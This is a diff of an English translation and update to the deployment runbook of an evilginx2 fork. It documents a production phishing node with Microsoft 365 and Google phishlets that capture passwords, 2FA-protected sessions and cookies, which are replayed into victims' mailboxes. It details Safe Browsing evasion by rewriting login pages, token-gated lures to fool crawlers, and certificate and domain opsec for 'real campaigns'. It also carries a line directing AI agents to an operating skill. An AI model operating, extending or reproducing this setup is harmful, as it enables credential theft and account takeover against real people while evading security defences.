@@ -1,39 +1,41 @@
-# Deploy — node evilginx2 (fake-evilginx-pro) trên VPS
+# Deploy — evilginx2 node (fake-evilginx-pro) on a VPS
 
-Trạng thái hiện tại của **node production** (1 VPS internet-facing, base
-`<BASE>.<ZONE>`, wildcard cert DNS-01). Cập nhật: **2026-09-10**.
+Current state of the **production node** (1 internet-facing VPS, base
+`<BASE>.<ZONE>`, wildcard cert via DNS-01). Updated: **2026-09-17**.
 
-> 🔒 **OPSEC**: hostname thật, IP, SSH key path và lure URL đầy đủ chỉ nằm trong docs/worklog
-> nội bộ ngoài repo (`.worklog/`, memory) — không bao giờ commit vào package này.
+> 🔒 **OPSEC**: real hostnames, IPs, SSH key paths and full lure URLs live only
+> in internal docs outside the repo (`.worklog/`, memory) — never committed.
 
-> 🤖 **AI agent**: đọc skill `skills/operating-fake-evilginx-pro/SKILL.md`
-> trước khi cài đặt/vận hành — tổng hợp runbook + toàn bộ gotcha đã chứng minh (trùng
-> `phish_sub`, vacuous completion, autocert burn, Google chặn IP datacenter, silent SNI drop).
+> 🤖 **AI agents**: read `skills/operating-fake-evilginx-pro/SKILL.md` before
+> installing/operating — runbook + every proven gotcha (duplicate `phish_sub`,
+> vacuous completion, autocert burn, Google datacenter-IP blocks, silent SNI
+> drops).
 
-## Trạng thái phishlet
+## Phishlet status
 
-| Phishlet | Trạng thái | Ghi chú |
+| Phishlet | Status | Notes |
 |---|---|---|
-| `ms365.yaml` | ✅ **ĐÓNG — production-ready** | Đạt toàn bộ mục tiêu: work flow (ESTSAUTH, #28) + consumer MSA full (`WLSSC` chốt, #54/#92) + mailbox reuse + SB-bypass verified + token-gate + CSD hardening. 2 caveat ghi trong worklog (work-flow E2E trên domain mới chờ hotspot — Umbrella chặn on-net; password-login sau hardening — account test passwordless). Phishlet GIỮ ENABLED trên node |
-| `google.yaml` | ✅ **ĐÓNG — production-ready qua real-browser relay** | MITM cổ điển bất khả thi (botguard gắn origin); giải bằng sidecar `bgrelay` (`tools/relay/`, tính năng #18): capture account thật kèm number-match 2FA, credentials + trọn bộ cookie `.google.com` (`~/bgrelay-store/`), **replay cookie mở Gmail verified**. CSD hardening + uTLS + residential exit qua tính năng #17. Lure relay: `/<PATH>?t=…` (relay:true). Hướng dẫn: `docs/google-relay.md` |
+| `ms365.yaml` | ✅ **CLOSED — production-ready** | All targets met: work flow (ESTSAUTH) + full consumer MSA (`WLSSC` is the key cookie) + mailbox reuse + SB-bypass verified + token-gate + CSD hardening. Two caveats in the worklog (work-flow E2E on the new domain awaits a hotspot — Umbrella blocks on-net; password-login after hardening untested — test account is passwordless). Kept ENABLED on the node |
+| `google.yaml` | ✅ **CLOSED — production-ready via real-browser relay** | Classic MITM is impossible (origin-bound botguard); solved with the `bgrelay` sidecar (`tools/relay/`, feature #18): real-account capture incl. number-match 2FA, credentials + the full `.google.com` cookie set (`~/bgrelay-store/`), **cookie replay into Gmail verified**. CSD hardening + uTLS + residential exit via feature #17. Relay lure: `/<PATH>?t=…` (relay:true). Guide: `docs/google-relay.md` |
 
-**URL lure:** `/<PATH1>`, `/<PATH2>` trên landing `signin.<BASE>.<ZONE>`
-- MS365: `/<PATH>` (thường) + `/<PATH>?t=<token>` (token-gated) trên landing `accounts.<BASE>.<ZONE>` — token lấy từ API, không lưu ở đây
+**Lure URLs:** `/<PATH1>`, `/<PATH2>` on landing `signin.<BASE>.<ZONE>`
+- MS365: `/<PATH>` (plain) + `/<PATH>?t=<token>` (token-gated) on landing
+  `accounts.<BASE>.<ZONE>` — tokens come from the API, never stored here
 
-## Kiến trúc hiện tại
+## Current architecture
 
 ```
-Victim ── DNS *.<BASE>.<ZONE> ──► evilginx2 :443 (internet-facing, VPS cloud)
-                                    │  wildcard cert *.<BASE>.<ZONE> (DNS-01, không per-host)
+Victim ── DNS *.<BASE>.<ZONE> ──► evilginx2 :443 (internet-facing, cloud VPS)
+                                    │  wildcard cert *.<BASE>.<ZONE> (DNS-01, no per-host certs)
                                     │  botguard: -bg-ja4 t13d15 -bg-trusted 127.0.0.1/32,<VPS_IP>/32
-                                    │  lure token-gate: thiếu ?t= → 302 benign (chống SB classify)
+                                    │  lure token-gate: missing ?t= → benign 302 (SB never classifies)
                                     ▼
                                  Origin (login.microsoftonline.com / accounts.google.com …)
 ```
 
-- **InfraGuard ĐÃ TẮT** (`systemctl disable --now infraguard`): lớp L7 kép làm hỏng MS OAuth
-  (double-L7). Evilginx đứng trực tiếp :443, botguard tự lo decoy scanner (JA4 allowlist +
-  UA blocklist + telemetry probe).
+- **InfraGuard is DISABLED** (`systemctl disable --now infraguard`): the double
+  L7 layer broke MS OAuth. Evilginx serves :443 directly; botguard handles
+  scanner decoys (JA4 allowlist + UA blocklist + telemetry probe).
 - **Systemd unit** (`/etc/systemd/system/evilginx2.service`):
 
 ```
@@ -42,123 +44,114 @@ ExecStart=/bin/sh -c 'tail -f /dev/null | <INSTALL_DIR>/evilginx2 \
   -botguard -bg-ja4 t13d15 -bg-trusted 127.0.0.1/32,<VPS_IP>/32'
 ```
 
-  ⚠ KHÔNG `-jsobf ultra` (làm vỡ JS trang MS login), KHÔNG `-debug` (leak password plaintext
-  vào journal). `-bg-trusted` = IP operator/VPS nội bộ, bỏ scoring cho test.
-- **API operator**: `:9443` mTLS, cert client tại `~/.evilginx/api/`.
-
-## Google pending — việc cần để đi tiếp
-
-Fork hỗ trợ upstream proxy sẵn (config `proxyConfig` → `setProxy`). Khi có residential/mobile
-proxy (http/socks5 + auth):
-
-1. Sửa `~/.evilginx/config.json`:
-```json
-"proxy": {"enabled": true, "type": "socks5", "address": "<proxy-host>", "port": "<port>",
-          "username": "<user>", "password": "<pass>"}
-```
-2. `sudo systemctl restart evilginx2`
-3. Test lại flow: vào lure google → email → password → cookies `.google.com`
-   (SID/HSID/SSID/APISID/SAPISID/__Secure-1PSID/__Secure-3PSID) phải capture đủ.
-
-Lưu ý: upstream proxy là TOÀN CỤC (ms365 cũng đi qua — không có hại).
+  ⚠ NO `-jsobf ultra` (breaks the MS login page JS), NO `-debug` in production
+  (leaks plaintext passwords into the journal). `-bg-trusted` = operator/VPS
+  internal IPs, skipping bot scoring for tests.
+- **Operator API**: `:9443` mTLS, client certs in `~/.evilginx/api/`.
+- **bgrelay sidecar**: `:9445` loopback (Google relay), captures in
+  `~/bgrelay-store/`; env `RELAY_SOCKS` (residential exit — secret, via
+  systemd drop-in) and `RELAY_OP_KEY` (pinned).
 
 ## Upstream proxy + per-target routing (feature #17)
 
-Proxy SOCKS5/HTTP(s) + auth cho upstream. Điểm mạnh: **routes theo domain suffix** — chỉ
-domain liệt kê đi qua proxy, còn lại direct. Ví dụ đang chạy trên node: Google qua
-residential exit, MS365 giữ IP node.
+SOCKS5/HTTP(S) proxy with auth for upstream traffic. The strength: **routing by
+domain suffix** — only listed domains go through the proxy, everything else
+dials direct. Current node setup: Google through a residential exit, MS365 on
+the node's own IP.
 
-**Quản trị (API mTLS hoặc console):**
+**Management (mTLS API or console):**
 ```bash
-# API — set full config (applies live, KHÔNG cần restart):
+# API — full config (applies live, NO restart):
 POST /proxy {"enabled":true,"type":"socks5","address":"<host>","port":<port>,
              "username":"<u>","password":"<p>","routes":["google.com","gstatic.com","googleusercontent.com"]}
-POST /proxy {"enabled":false}            # off (partial update — key thiếu = giữ nguyên)
-GET  /proxy                               # status (password MASKED — không lộ)
+POST /proxy {"enabled":false}            # off (partial update — omitted keys keep values)
+GET  /proxy                               # status (password MASKED)
 
 # egconsole:
 proxy                                     # status
 proxy set socks5 <host> <port> <user> <pass> google.com,gstatic.com,googleusercontent.com
-proxy route add microsoftonline.com       # thêm suffix đi qua proxy (hot-apply)
+proxy route add microsoftonline.com       # add a routed suffix (hot-apply)
 proxy route del <suffix> | proxy on | proxy off
 
-# terminal trên node:
+# terminal on the node:
 proxy | proxy routes | proxy route add|del <suffix> | proxy enable | proxy disable
 ```
 
-**Lưu ý:** GET trả password MASKED — POST thiếu key `password` sẽ giữ giá trị cũ (partial
-update), không bao giờ ghi đè bằng dấu `*`. Routes rỗng = TOÀN BỘ upstream qua proxy
-(behavior gốc). Egress residential phải khác IP node — verify bằng
-`curl --socks5 <proxy> https://ifconfig.me` trước khi cấu hình.
+**Notes:** GET returns a MASKED password — a POST without the `password` key
+keeps the old value (partial update); never write asterisks back over it. Empty
+routes = ALL upstream traffic through the proxy (original behavior). The
+residential egress must differ from the node IP — verify with
+`curl --socks5 <proxy> https://ifconfig.me` before configuring.
 
-## Tools phía operator (Windows client)
+## Operator-side tools (workstation)
 
-| Tool | Vai trò |
+| Tool | Role |
 |---|---|
-| `tools/egconsole.py` | Console REPL duy nhất: fleet API (status/phishlets/sessions/lures), `export <id>`, `open <id>` (mở browser signed-in), `tail` (SSH journal), `puppet` — config `tools/my-servers.json` + `tools/console.json` (đều gitignored, mẫu: `*.example.json`) |
-| `tools/lib/session_launcher.py` | Mở Chrome/Edge với cookies session từ API (`--fresh`, `--headless`, `--disable-http2` cho login.live.com) |
-| `deploy/export_session_cookies.py` | Xuất cookies db → Cookie-Editor JSON |
-| `src/puppet` (evilpuppet-lite) | chromedp headless: auto-login + chờ MFA + push cookies qua API mTLS |
+| `tools/egconsole.py` | The single REPL console: fleet API (status/phishlets/sessions/lures), `export <id>`, `open <id>` (signed-in browser), `tail` (SSH journal), `puppet` — config `tools/my-servers.json` + `tools/console.json` (gitignored; templates: `*.example.json`) |
+| `tools/lib/session_launcher.py` | Opens Chrome/Edge with session cookies from the API (`--fresh`, `--headless`, `--disable-http2` for login.live.com) |
+| `deploy/export_session_cookies.py` | Node-side: dump db cookies → Cookie-Editor JSON |
+| `src/puppet` (evilpuppet-lite) | chromedp headless: auto-login + wait for MFA + push cookies via the mTLS API |
 
-## Quy tắc vận hành (đã chứng minh bằng burn/thiệt hại thật)
+## Operating rules (each proven by a real burn/loss)
 
-- **KHÔNG BAO GIỜ** bật `autocert` / issue per-host cert trên node internet-facing — mỗi cert
-  per-host vào CT logs = nguy cơ burn. Wildcard DNS-01 duy nhất (runbook: `wildcard-cert-setup.sh`).
-- Domain đã burn x2 bởi Google Safe Browsing (registered domain poisoned) — KHÔNG chạy
-  campaign thật trên nó; node chỉ dùng test nội bộ (bypass "unsafe site"). Campaign thật:
-  **domain mới** + chạy `wildcard-cert-setup.sh` từ đầu (hướng dẫn đầy đủ trong README.md gốc,
-  mục "Domain mới cho campaign").
-- **KHÔNG test lure bằng Chrome/Safari thật có Safe Browsing** — test bằng curl/IAB/browser tắt SB
-- **PHISHLETS bị gitignore theo thiết kế** (`src/phishlets/*.yaml`) — repo công khai không ship
-  phishlet campaign (comment + cấu trúc lộ mục tiêu). Vận hành: đặt file phishlet vào
-  `src/phishlets/` trên node; `deploy.sh` cảnh báo nếu thiếu (bỏ qua bằng `ALLOW_NO_PHISHLET=1`).
-  Phishlet mẫu cho lab: `examples/phishlets/`
-- **Phishlet chung 1 base domain: CẤM trùng `phish_sub`** — trùng là `getPhishletByPhishHost`
-  (Go map, ngẫu nhiên) ghép nhầm phishlet → redirect chéo/phiên chết. google dùng `signin`/`gwww`,
-  ms365 giữ `accounts`/`www`.
-- Lure URL luôn lấy từ console/API (đúng landing host) — hostname lạ ngoài `IsActiveHostname`
-  bị evilginx **drop im lặng** (browser treo, không có TLS alert — opsec by design).
-- Lure phát campaign dùng bản **token-gated** (`"token":"auto"`) — bare lure URL để dành cho
-  crawler thấy redirect benign.
-- `-debug` chỉ bật khi iterate rồi TẮT ngay (leak password vào journal); rotate journal nếu đã bật.
-- Session work account thật: KHÔNG test trên account công ty (chỉ test account/tenant được cấp).
-- Db có plaintext password — redact trước khi archive/share.
+- **NEVER** enable `autocert` / issue per-host certs on an internet-facing
+  node — every per-host cert lands in CT logs = burn risk. Wildcard DNS-01 only
+  (runbook: `wildcard-cert-setup.sh`).
+- The old domain was burned x2 by Google Safe Browsing (registered-domain
+  poisoning) — NO real campaign on it; internal testing only. Real campaigns:
+  **a fresh domain** + `wildcard-cert-setup.sh` from scratch (full guide in the
+  root README, "New domain for a campaign").
+- **Do not test lures with a real SB-enabled Chrome/Safari** — test with
+  curl/IAB/SB-off browsers (client-side detection flags from the tester's own
+  browser).
+- **Phishlets are gitignored by design** (`src/phishlets/*.yaml`) — the public
+  repo never ships campaign phishlets (comments + structure leak targets).
+  Operations: place phishlet files in `src/phishlets/` on the node; `deploy.sh`
+  warns when missing (override with `ALLOW_NO_PHISHLET=1`). Lab sample:
+  `examples/phishlets/`.
+- **Phishlets sharing one base domain: NEVER duplicate `phish_sub`** —
+  duplicates make `getPhishletByPhishHost` (a Go map, random iteration) bind
+  the wrong phishlet → cross-redirects/dead sessions. google uses
+  `signin`/`gwww`, ms365 keeps `accounts`/`www`.
+- Always take lure URLs from the console/API (correct landing host) — an
+  unknown hostname outside `IsActiveHostname` is **silently dropped** by
+  evilginx (the browser hangs with no TLS alert — opsec by design).
+- Campaign lures are **token-gated** (`"token":"auto"`) — bare lure URLs are
+  what crawlers should see (benign redirect).
+- `-debug` only while iterating, then OFF immediately (leaks passwords into
+  the journal); rotate the journal if it was on.
+- Real work accounts: NEVER test on company accounts (only provisioned test
+  accounts/tenants).
+- The db stores plaintext passwords — redact before archiving/sharing.
 
-## Các fix gần đây (đã build + deploy, commit local)
+## Verified platform limits (not fixable by configuration)
 
-| Ngày | Fix |
-|---|---|
-| 2026-09-11 | **CSD hardening v1+v2 (SB bypass — VERIFIED)**: js_inject ms365 (consumer `/ppsecure/post.srf` + work `/login`): v1 xoá `input[type=password]` khỏi DOM (swap `type=text` + `-webkit-text-security:disc`, MutationObserver, submit không đổi); v2 brand lazy-reveal (logo/brand MS ẩn lúc load, hiện sau gesture đầu). Kết quả: Chrome SB bật full flow → không flag. Nghiên cứu cơ chế CSPD kèm nguồn trong worklog |
-| 2026-09-11 | Rotate host password `sso`→`login` sau khi `sso` bị flag (flag do test bằng Chrome có SB — client-side detection, không phải crawler) |
-| 2026-09-10 | **Lure token-gate**: `Lure.Token` + gate trong lure handling (constant-time compare) + `X-Eg-Gate` marker để OnResponse không rewrite Location benign ngược về phish domain + API `token:"auto"` |
-| 2026-09-10 | `session.go`: chặn vacuous-completion (phishlet required=0 không bao giờ auto-done — trước đây session bị đánh dấu hoàn thành oan ngay khi mở lure → flow gãy → Google trả lỗi generic) |
-| 2026-09-10 | `http_proxy.go`: log `completion-check` (host/required/captured) mỗi khi session hoàn thành — evidence runtime |
-| 2026-09-10 | `hotreload.go`: `RefreshCerts` gate `IsAutocertEnabled` — trước đây mỗi hot-reload gọi ACME cho toàn bộ hostname (nguy cơ per-host cert vào CT = burn + treo TLS handshake) |
-| 2026-09-10 | `google.yaml`: rename landing `accounts`→`signin`, `www`→`gwww` (xung đột với ms365) |
-| 2026-09-09 | `http_proxy.go`: cookie persist xuống SQLite; `__Host-` cookie không gán Domain (RFC 6265bis); `session.go`: domain all-optional không chặn completion |
-
-## Giới hạn nền tảng đã xác minh (không phá được bằng config)
-
-- **Consumer MSA (outlook/hotmail cá nhân)**: MS phá post-auth flow qua nhiều domain
-  (account.live.com...) → password + cookies capture ĐƯỢC, phiên trong browser victim không
-  giữ được. Giới hạn cấu trúc — bản Pro tương tự. Work account (single-host AAD) không vướng.
-- **Passkey/passwordless**: chống-MITM cấu trúc — phishlet chỉ bắt được khi account dùng password.
-- **Google + MITM (kết quả cuối 2026-09-11, đã test 3 tổ hợp):** Google TỪ CHỐI sign-in ở
-  server-side bất kể IP (AWS / hosting VN / VNPT residential) và TLS (Go / utls Chrome) —
-  botguard của Google gắn origin: trang chạy trên domain phish → bgdata bị chấm thất bại.
-  Username capture (f.req) + uTLS + CSD hardening đều hoạt động — điểm nghẽn duy nhất là
-  lớp botguard origin-bound. Đây là giới hạn nền tảng của MỌI MITM proxy HTTPS cho Google,
-  không phải thiếu sót của fork. Google phishlet giữ lại làm tài liệu tham khảo/có thể mở
-  lại khi có hướng mới (vd reverse-full-page, session-token approach).
-- `ERR_HTTP2_PROTOCOL_ERROR` giữa Chromium headless ↔ login.live.com: dùng `--disable-http2`.
+- **Consumer MSA (personal outlook/hotmail)**: Microsoft splits the post-auth
+  flow across domains (account.live.com…) → password + cookies ARE captured,
+  but the victim's in-browser session doesn't persist. A structural limit —
+  the commercial Pro behaves the same. Work accounts (single-host AAD) are
+  unaffected.
+- **Passkey/passwordless**: structurally MITM-resistant — the phishlet only
+  captures when the account uses a password.
+- **Google + classic MITM (final result 2026-09-11, 3 combinations tested):**
+  Google rejects the sign-in server-side regardless of IP (AWS / VN hosting /
+  VNPT residential) and TLS (Go / uTLS Chrome) — Google's botguard is
+  origin-bound: running the page on the phish domain fails the bgdata check.
+  Username capture (`f.req`), uTLS and CSD hardening all work; the single
+  bottleneck is the origin-bound botguard layer. This is a platform limit of
+  EVERY HTTPS MITM proxy for Google — solved in this fork by the real-browser
+  relay (#18) instead.
+- `ERR_HTTP2_PROTOCOL_ERROR` between headless Chromium and login.live.com: use
+  `--disable-http2`.
 
 ## File map
 
-| File | Vai trò |
+| File | Role |
 |---|---|
-| `deploy.sh` | orchestrator dựng node mới (deps/certs/evilginx/ja4/verify) |
-| `wildcard-cert-setup.sh` | wildcard DNS-01 + autocert OFF + renew cron (runbook đổi base/domain mới) |
-| `setup_evilginx.sh` / `setup_infraguard.sh` | dựng service (infraguard hiện TẮT — giữ để tuỳ chọn) |
-| `templates/*.tpl` | systemd unit + infraguard config **mẫu placeholder** (giá trị thật render trên node, không commit) |
-| `session_launcher.py` / `export_session_cookies.py` | client tools cho session reuse |
-| `tools/egconsole.py` (ngoài deploy/) | operator console |
+| `deploy.sh` | orchestrator for a fresh node (deps/certs/evilginx/ja4/verify) |
+| `wildcard-cert-setup.sh` | wildcard DNS-01 + autocert OFF + renew hook (runbook for new bases/domains) |
+| `setup_evilginx.sh` / `setup_infraguard.sh` | service setup (infraguard currently OFF — kept as an option) |
+| `sync-node.sh` | one-command source update: sync src+relay → build → restart → heartbeat |
+| `templates/*.tpl` | systemd unit + infraguard config **placeholder templates** (real values rendered on the node, never committed) |
+| `export_session_cookies.py` | node-side session cookie export |
+| `tools/egconsole.py` (outside deploy/) | operator console |
